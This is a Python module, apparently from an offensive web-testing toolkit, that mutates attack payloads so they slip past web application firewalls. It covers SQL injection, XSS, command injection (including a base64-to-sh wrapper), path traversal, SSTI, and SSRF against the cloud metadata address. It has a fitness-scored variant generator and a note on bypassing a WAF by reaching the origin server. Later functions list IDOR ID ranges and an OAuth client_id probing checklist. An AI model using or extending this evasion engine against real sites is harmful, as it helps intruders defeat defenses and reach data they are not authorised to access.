"""Pure payload mutation operators and technique families."""

import base64
import re
from urllib.parse import quote, unquote


def _op_case_swap(payload):
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))


def _op_url_encode(payload):
    return quote(payload, safe="")


def _op_double_url_encode(payload):
    return quote(quote(payload, safe=""), safe="")


def _op_inline_comment(payload):
    return payload.replace(" ", "/**/")


def _op_versioned_comment(payload):
    return re.sub(r"(?i)\b(union|select|from|where|and|or)\b", r"/*!50000\1*/", payload)


def _op_whitespace_alt(payload):
    return payload.replace(" ", "%0a")


def _op_whitespace_tab(payload):
    return payload.replace(" ", "%09")


def _op_whitespace_cr(payload):
    return payload.replace(" ", "%0d")


def _op_keyword_split(payload):
    out = payload
    for word in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR"):
        out = re.sub(
            rf"(?i){word}",
            lambda match: match.group(0)[:2] + "/**/" + match.group(0)[2:],
            out,
        )
    return out


def _op_html_entity(payload):
    """Numeric entities for JS identifiers. Does not encode < > (that kills XSS)."""
    return payload.replace("alert", "&#97;lert").replace("ALERT", "&#65;LERT")


def _op_numeric_entity(payload):
    return payload.replace("alert", "&#97;&#108;&#101;&#114;&#116;").replace(
        "(", "&#40;").replace(")", "&#41;")


def _op_js_unicode(payload):
    return "".join("\\u%04x" % ord(c) if c.isalpha() else c for c in payload)


def _op_tag_breakup(payload):
    return payload.replace("script", "scr<x>ipt").replace("alert", "al<x>ert")


def _op_nested_tag(payload):
    return payload.replace("script", "scr<script>ipt").replace("SCRIPT", "SCR<SCRIPT>IPT")


def _op_svg_alt(payload):
    return payload.replace("<script>", "<svg/onload=").replace("</script>", ">")


def _op_event_swap(payload):
    swapped = re.sub(r"(?i)<script[^>]*>", "<img/src=x onerror=", payload)
    swapped = re.sub(r"(?i)</script>", ">", swapped)
    if swapped != payload:
        return swapped
    return re.sub(r"(?i)onload=", "onerror=", payload)


def _op_ifs(payload):
    return payload.replace(" ", "${IFS}")


def _op_quote_insert(payload):
    return re.sub(
        r"([a-z]{2,})",
        lambda match: match.group(1)[0] + "''" + match.group(1)[1:],
        payload,
        count=1,
    )


def _op_b64_wrap(payload):
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded}|base64 -d|sh"


def _op_dot_alt(payload):
    return payload.replace("../", "....//")


def _op_unicode_slash(payload):
    return payload.replace("/", "%c0%af")


def _op_null_byte(payload):
    return payload + "%00"


def _op_union_all(payload):
    return re.sub(r"(?i)union\s+select", "UNION ALL SELECT", payload)


def _op_hex_char(payload):
    def repl(match):
        inner = match.group(1)
        if not inner:
            return match.group(0)
        return "CHAR(" + ",".join(str(ord(ch)) for ch in inner) + ")"

    return re.sub(r"'([^']{1,32})'", repl, payload, count=1)


def _op_ssti_jinja_attr(payload):
    return payload.replace("{{7*7}}", "{{7*'7'}}").replace("{{7 * 7}}", "{{7*'7'}}")


def _op_ssti_dollar(payload):
    if "{{" in payload:
        return payload.replace("{{", "${").replace("}}", "}")
    return payload


def _op_ssrf_decimal_ip(payload):
    return payload.replace("169.254.169.254", "2852039166")


def _op_ssrf_hex_ip(payload):
    return payload.replace("169.254.169.254", "0xa9fea9fe")


def _op_path_semicolon(payload):
    return payload.replace("../", "..;/")


def _op_path_dot_encode(payload):
    return payload.replace("../", "%2e%2e/")


OPERATORS = {
    "case_swap": _op_case_swap,
    "url_encode": _op_url_encode,
    "double_url_encode": _op_double_url_encode,
    "inline_comment": _op_inline_comment,
    "versioned_comment": _op_versioned_comment,
    "whitespace_alt": _op_whitespace_alt,
    "whitespace_tab": _op_whitespace_tab,
    "whitespace_cr": _op_whitespace_cr,
    "keyword_split": _op_keyword_split,
    "html_entity": _op_html_entity,
    "numeric_entity": _op_numeric_entity,
    "js_unicode": _op_js_unicode,
    "tag_breakup": _op_tag_breakup,
    "nested_tag": _op_nested_tag,
    "svg_alt": _op_svg_alt,
    "event_swap": _op_event_swap,
    "ifs_sub": _op_ifs,
    "quote_insert": _op_quote_insert,
    "b64_wrap": _op_b64_wrap,
    "dot_alt": _op_dot_alt,
    "unicode_slash": _op_unicode_slash,
    "null_byte": _op_null_byte,
    "union_all": _op_union_all,
    "hex_char": _op_hex_char,
    "ssti_jinja_attr": _op_ssti_jinja_attr,
    "ssti_dollar": _op_ssti_dollar,
    "ssrf_decimal_ip": _op_ssrf_decimal_ip,
    "ssrf_hex_ip": _op_ssrf_hex_ip,
    "path_semicolon": _op_path_semicolon,
    "path_dot_encode": _op_path_dot_encode,
}

OPERATOR_META = {
    "case_swap": {
        "families": ["sql_injection", "xss_reflected", "xss_stored", "command_injection",
                     "ssti", "file_upload", "nosql", "graphql"],
        "preserves_semantics": True, "breaks_tokens": ["keyword"],
        "contexts": ["sql", "html", "js", "cmd"],
    },
    "url_encode": {
        "families": ["sql_injection", "xss_reflected", "xss_stored", "command_injection",
                     "path_traversal", "ssti", "ssrf", "xxe", "graphql", "nosql"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["url"],
    },
    "double_url_encode": {
        "families": ["sql_injection", "path_traversal", "ssrf", "file_upload", "xxe",
                     "xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["url"],
    },
    "inline_comment": {
        "families": ["sql_injection", "graphql"],
        "preserves_semantics": True, "breaks_tokens": ["space"],
        "contexts": ["sql"],
    },
    "versioned_comment": {
        "families": ["sql_injection"],
        "preserves_semantics": True, "breaks_tokens": ["keyword"],
        "contexts": ["sql"],
    },
    "whitespace_alt": {
        "families": ["sql_injection", "ssti", "nosql", "graphql"],
        "preserves_semantics": True, "breaks_tokens": ["space"],
        "contexts": ["sql", "url"],
    },
    "whitespace_tab": {
        "families": ["sql_injection"],
        "preserves_semantics": True, "breaks_tokens": ["space"],
        "contexts": ["sql", "url"],
    },
    "whitespace_cr": {
        "families": ["sql_injection"],
        "preserves_semantics": True, "breaks_tokens": ["space"],
        "contexts": ["sql", "url"],
    },
    "keyword_split": {
        "families": ["sql_injection"],
        "preserves_semantics": True, "breaks_tokens": ["UNION", "SELECT", "AND", "OR"],
        "contexts": ["sql"],
    },
    "html_entity": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["alert"],
        "contexts": ["html"],
    },
    "numeric_entity": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["alert"],
        "contexts": ["html"],
    },
    "js_unicode": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["keyword"],
        "contexts": ["js"],
    },
    "tag_breakup": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["script", "alert"],
        "contexts": ["html"],
    },
    "nested_tag": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["script"],
        "contexts": ["html"],
    },
    "svg_alt": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["script"],
        "contexts": ["html"],
    },
    "event_swap": {
        "families": ["xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["script", "onload"],
        "contexts": ["html"],
    },
    "ifs_sub": {
        "families": ["command_injection"],
        "preserves_semantics": True, "breaks_tokens": ["space"],
        "contexts": ["cmd"],
    },
    "quote_insert": {
        "families": ["command_injection"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["cmd"],
    },
    "b64_wrap": {
        "families": ["command_injection"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["cmd"],
    },
    "dot_alt": {
        "families": ["path_traversal"],
        "preserves_semantics": True, "breaks_tokens": ["../"],
        "contexts": ["path"],
    },
    "unicode_slash": {
        "families": ["path_traversal"],
        "preserves_semantics": True, "breaks_tokens": ["/"],
        "contexts": ["path", "url"],
    },
    "null_byte": {
        "families": ["path_traversal", "file_upload"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["path"],
    },
    "union_all": {
        "families": ["sql_injection"],
        "preserves_semantics": True, "breaks_tokens": ["UNION SELECT"],
        "contexts": ["sql"],
    },
    "hex_char": {
        "families": ["sql_injection", "xss_reflected", "xss_stored"],
        "preserves_semantics": True, "breaks_tokens": ["'"],
        "contexts": ["sql"],
    },
    "ssti_jinja_attr": {
        "families": ["ssti"],
        "preserves_semantics": True, "breaks_tokens": [],
        "contexts": ["html"],
    },
    "ssti_dollar": {
        "families": ["ssti"],
        "preserves_semantics": True, "breaks_tokens": ["{{"],
        "contexts": ["html"],
    },
    "ssrf_decimal_ip": {
        "families": ["ssrf"],
        "preserves_semantics": True, "breaks_tokens": ["169.254.169.254"],
        "contexts": ["url"],
    },
    "ssrf_hex_ip": {
        "families": ["ssrf"],
        "preserves_semantics": True, "breaks_tokens": ["169.254.169.254"],
        "contexts": ["url"],
    },
    "path_semicolon": {
        "families": ["path_traversal"],
        "preserves_semantics": True, "breaks_tokens": ["../"],
        "contexts": ["path"],
    },
    "path_dot_encode": {
        "families": ["path_traversal"],
        "preserves_semantics": True, "breaks_tokens": ["../"],
        "contexts": ["path", "url"],
    },
}

FAMILY_OPS = {
    "sql_injection": [
        "inline_comment", "versioned_comment", "keyword_split", "case_swap",
        "whitespace_alt", "url_encode", "double_url_encode", "union_all",
        "hex_char", "whitespace_tab",
    ],
    "xss_reflected": [
        "case_swap", "tag_breakup", "svg_alt", "js_unicode", "url_encode",
        "double_url_encode", "html_entity", "hex_char",
        "nested_tag", "event_swap", "numeric_entity",
    ],
    "xss_stored": [
        "case_swap", "tag_breakup", "svg_alt", "js_unicode", "url_encode",
        "double_url_encode", "html_entity", "hex_char",
        "nested_tag", "event_swap",
    ],
    "command_injection": ["ifs_sub", "quote_insert", "b64_wrap", "case_swap", "url_encode"],
    "path_traversal": [
        "dot_alt", "url_encode", "double_url_encode", "unicode_slash", "null_byte",
        "path_semicolon", "path_dot_encode",
    ],
    "ssti": ["whitespace_alt", "case_swap", "url_encode", "ssti_jinja_attr", "ssti_dollar"],
    "ssrf": ["ssrf_decimal_ip", "ssrf_hex_ip", "url_encode", "double_url_encode"],
    "xxe": ["url_encode", "case_swap"],
    "file_upload": ["case_swap", "null_byte", "double_url_encode"],
    "nosql": ["case_swap", "url_encode", "whitespace_alt"],
    "graphql": ["whitespace_alt", "url_encode", "inline_comment"],
}

FAMILY_ALIAS = {
    "sql_injection_blind": "sql_injection", "rce": "command_injection",
    "lfi": "path_traversal", "rfi": "path_traversal", "xss_dom": "xss_reflected",
    "file_upload_bypass": "file_upload",
}


def payload_family(technique):
    return FAMILY_ALIAS.get(technique, technique)


def family_operators(fam, waf=""):
    ops = list(FAMILY_OPS.get(fam) or [])
    if not ops:
        return []
    if waf:
        from cco_reasoning_core.waf_profiles import WAF_EVASION_OPS, normalize_waf
        preferred = [name for name in WAF_EVASION_OPS.get(normalize_waf(waf), []) if name in ops]
        ops = preferred + [name for name in ops if name not in preferred]
    return ops


def apply_operators(payload, names):
    current = payload
    for name in names or []:
        func = OPERATORS.get(name)
        if not func:
            continue
        try:
            nxt = func(current)
        except Exception:
            continue
        if nxt:
            current = nxt
    return current


def _collapse_for_semantic(text):
    collapsed = re.sub(r"/\*.*?\*/", " ", text or "", flags=re.S)
    collapsed = collapsed.replace("%0a", " ").replace("%09", " ").replace("%0d", " ")
    try:
        collapsed = unquote(collapsed)
    except Exception:
        pass
    return collapsed


def semantic_ok(variant, family):
    text = variant or ""
    if family == "sql_injection":
        collapsed = _collapse_for_semantic(text)
        compact = re.sub(r"[^a-z0-9']+", "", collapsed.lower())
        return any(token in compact for token in (
            "union", "select", "and", "sleep", "benchmark", "char",
        )) or "'" in collapsed or bool(re.search(r"(^|[^a-z])or([^a-z]|$)", collapsed, re.I))
    if family in ("xss_reflected", "xss_stored"):
        if "&lt;" in text and "<" not in text:
            return False
        return bool(re.search(r"<|onerror|onload|svg|script|javascript:|&#\d+", text, re.I))
    if family == "command_injection":
        return bool(re.search(r"[;|&`]|\$\{IFS\}|base64", text))
    if family in ("path_traversal", "lfi"):
        return bool(re.search(r"\.\.|etc/passwd|win\.ini|%2e|%c0%af|\.\./", text, re.I))
    if family == "ssti":
        return bool(re.search(r"\{\{|\$\{|7\s*\*\s*7", text))
    if family == "ssrf":
        return bool(re.search(r"169\.254|0x|https?://|\d{8,}", text))
    return True


def signal_break_score(base, variant, blocked_by):
    tokens = [token for token in re.split(r"[^A-Za-z0-9]+", blocked_by or "") if len(token) >= 3]
    if not tokens:
        return 0.0
    broken = sum(
        1 for token in tokens
        if token.lower() in (base or "").lower() and token.lower() not in (variant or "").lower()
    )
    return min(1.0, broken / len(tokens))


def default_fitness(base, variant, ops, technique, blocked_by):
    if not variant or variant == base:
        return 0.0
    family = payload_family(technique)
    semantic = 1.0 if semantic_ok(variant, family) else 0.0
    signal = signal_break_score(base, variant, blocked_by)
    count = len(ops or [])
    short_chain = min(1.0, count / 2.0) if count else 0.0
    diversity_penalty = max(0.0, (count - 2) * 0.12)
    score = 0.40 * signal + 0.45 * semantic + 0.15 * short_chain - diversity_penalty
    return round(max(0.0, score), 4)


def generate_variants(payload, technique, blocked_by="", waf="", generations=2,
                      population=8, score_fn=None, bonus_fn=None):
    """Guided mutation. Returns the evolve_payload JSON-ready dict (no I/O)."""
    fam = payload_family(technique)
    ops = family_operators(fam, waf=waf)
    if not payload or not ops:
        return {
            "variants": [], "technique": technique, "family": fam,
            "error": "payload boş veya bu teknik için operatör ailesi yok",
            "supported": list(FAMILY_OPS.keys()),
            "engine": "guided mutation (WAF-aware, lessons-weighted fitness)",
            "base_payload": payload, "blocked_by": blocked_by, "waf": waf or None,
            "operators_available": ops, "generated": 0,
        }
    generations = max(1, min(int(generations or 1), 3))
    candidates, expanded = {}, set()

    def expand(current, current_ops, depth):
        if current in expanded or len(candidates) >= 1500:
            return
        expanded.add(current)
        for name in ops:
            func = OPERATORS.get(name)
            if not func:
                continue
            try:
                nxt = func(current)
            except Exception:
                continue
            if not nxt or nxt == current:
                continue
            new_ops = current_ops + [name]
            if nxt not in candidates:
                candidates[nxt] = new_ops
            if depth + 1 < generations:
                expand(nxt, new_ops, depth + 1)

    expand(payload, [], 0)
    score_fn = score_fn or default_fitness
    scored = [
        {"payload": variant, "operators": used, "fitness": score_fn(payload, variant, used, technique, blocked_by)}
        for variant, used in candidates.items()
    ]
    if bonus_fn is None:
        try:
            from cco_reasoning_core.waf_profiles import waf_pref_bonus as bonus_fn
        except Exception:
            bonus_fn = lambda _ops, _waf: 0
    scored.sort(key=lambda item: (item["fitness"], bonus_fn(item["operators"], waf)), reverse=True)
    return {
        "engine": "guided mutation (WAF-aware, lessons-weighted fitness)",
        "base_payload": payload, "technique": technique, "family": fam,
        "blocked_by": blocked_by, "waf": waf or None, "operators_available": ops,
        "generated": len(scored), "variants": scored[:max(1, int(population or 1))],
        "note": "Varyant işe yarar/yaramazsa record_payload_result ile kaydet. WAF için: önce "
                "fingerprint_waf; CDN ise discover_origin (origin'e doğrudan giderek WAF'ı atla).",
    }


# ── blind-01 kural 3: kurumsal ID aralığı sezgisi (sayısal IDOR) ──────────────
# 1/2/3 denemek yetmez: kurumsal sistemler ofsetli/seri/yil-prefiksli ID kullanir.
IDOR_ID_RANGES = [
    "1-10",            # klasik dusuk seri
    "100-110",         # yuvarlak ofset
    "1000-1010",       # fatura/siparis serisi (4 hane)
    "10000-10010",     # 5 hane seri
    "5000-5010",       # orta ofset
]


def idor_id_candidates(extra_seeds=()):
    """Sayisal IDOR tarama adaylari: kucuk seri + kurumsal araliklar.

    Args:
        extra_seeds: Gozlemlenen ID'ler (hesap no, yil vb.) — yakin komsular
            (+-5) otomatik eklenir.

    Returns:
        Sirali unique int listesi (bounded: ~100 aday).
    """
    out = set()
    for lo, hi in ((1, 10), (100, 110), (1000, 1010), (5000, 5010), (10000, 10010)):
        out.update(range(lo, hi + 1))
    for seed in extra_seeds or ():
        try:
            n = int(str(seed).strip())
        except (TypeError, ValueError):
            continue
        out.update(range(max(1, n - 5), n + 6))
    return sorted(out)


# ── blind-01 kural 5: OAuth client kesfi (ezber client_id yerine kesif) ───────
# Jenerik 'web/app/storefront' denemesi yerine: well-known + JS bundle + hata
# mesajlarindan gercek client_id'yi cikar. Asagidaki sira, denenme onceligidir.
OAUTH_DISCOVERY = {
    "wellknown_paths": [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/.well-known/openid-configuration",
        "/auth/.well-known/openid-configuration",
    ],
    "js_patterns": [
        "client_id", "clientId", "CLIENT_ID", "authorize?client_id=",
        "/oauth/authorize", "redirect_uri",
    ],
    "probe_order": [
        "wellknown",   # 1. OIDC discovery JSON'undan issuer + authorize endpoint
        "js_bundle",   # 2. SPA bundle/env.js icinden client_id regex
        "error_mine",  # 3. Hatali authorize cagrisinin hata mesajindan ipucu
        "generic",     # 4. SON care: jenerik liste (web, app, spa, portal, ... )
    ],
    "generic_clients": [
        "web", "app", "spa", "portal", "storefront", "mobile", "public-client",
        "frontend", "admin", "partner-portal", "customer-portal",
    ],
}


def oauth_discovery_checklist():
    """OAuth client kesif adimlari (sirayla uygula, ilk basarida dur)."""
    return [
        "GET /.well-known/openid-configuration (+ varyantlar) — issuer/authorize URL'lerini al",
        "SPA JS bundle + /env.js icinde client_id/clientId/authorize regex tara",
        "/oauth/authorize'a bos/hatali client_id ile istek at, hata mesajini madencilikle",
        "Bulunamadiysa generic listeyi dene (web, app, spa, portal, ...)",
        "Bulunan HER client_id icin redirect_uri validasyonunu ayri test et (uc-basina hukum)",
    ]
